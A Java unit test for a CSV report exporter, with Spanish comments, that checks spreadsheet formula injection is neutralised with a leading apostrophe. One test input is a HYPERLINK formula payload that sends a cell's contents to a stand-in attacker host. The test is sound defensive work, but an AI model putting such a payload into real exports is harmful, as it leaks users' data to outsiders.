package com.akine.reporting.application;

import static org.assertj.core.api.Assertions.assertThat;

import com.akine.reporting.spi.AporteDeReporte;
import com.akine.reporting.spi.FilaDeReporte;
import com.akine.reporting.spi.ReporteCode;
import java.time.Instant;
import java.time.LocalDate;
import java.util.List;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * El CSV se abre en una planilla, y una planilla evalua formulas.
 *
 * <p>El entrecomillado de RFC 4180 resuelve el <i>parseo</i> y no evita que Excel o LibreOffice
 * ejecuten una celda que empieza con {@code =}. Hoy ninguna celda del reporte es texto libre del
 * usuario, asi que no es explotable — pero lo es por accidente: el SPI invita a que cada modulo
 * aporte su seccion, y la primera con un nombre de financiador o un motivo lo vuelve un vector.
 */
@DisplayName("El export CSV")
class ExportadorCsvTest {

	private final ExportadorCsv exportador = new ExportadorCsv();

	private String csvConCelda(String celda) {
		AporteDeReporte seccion = new AporteDeReporte(
				"prueba", "Prueba", List.of(), List.of("Concepto"),
				List.of(FilaDeReporte.de(celda)), List.of());
		return exportador.aCsv(new ReporteView(
				ReporteCode.values()[0], 7L,
				LocalDate.of(2026, 9, 1), LocalDate.of(2026, 9, 30),
				"America/Argentina/Cordoba", Instant.parse("2026-09-20T12:00:00Z"),
				List.of(seccion), List.of(), List.of()));
	}

	@ParameterizedTest
	@ValueSource(strings = {
			"=HYPERLINK(\"http://atacante/?\"&A1,\"Click\")",
			"+1+1",
			"-1+1",
			"@SUM(A1:A9)"
	})
	@DisplayName("neutraliza la celda que una planilla leeria como formula")
	void neutralizaLasFormulas(String celda) {
		String csv = csvConCelda(celda);

		// Apostrofo delante: la planilla lo lee como texto y el valor se ve completo. Recortar
		// el primer caracter perderia informacion.
		assertThat(csv).contains("\"'" + celda.replace("\"", "\"\"") + "\"");
	}

	@Test
	@DisplayName("y sigue escapando segun RFC 4180 lo que no es formula")
	void loNormalNoCambia() {
		// Sin apostrofo: el texto comun no se toca. Si se tocara, cada celda del reporte
		// arrancaria con basura visible.
		assertThat(csvConCelda("Obra Social, S.A. \"La\" del centro"))
				.contains("\"Obra Social, S.A. \"\"La\"\" del centro\"")
				.doesNotContain("\"'Obra");
	}
}
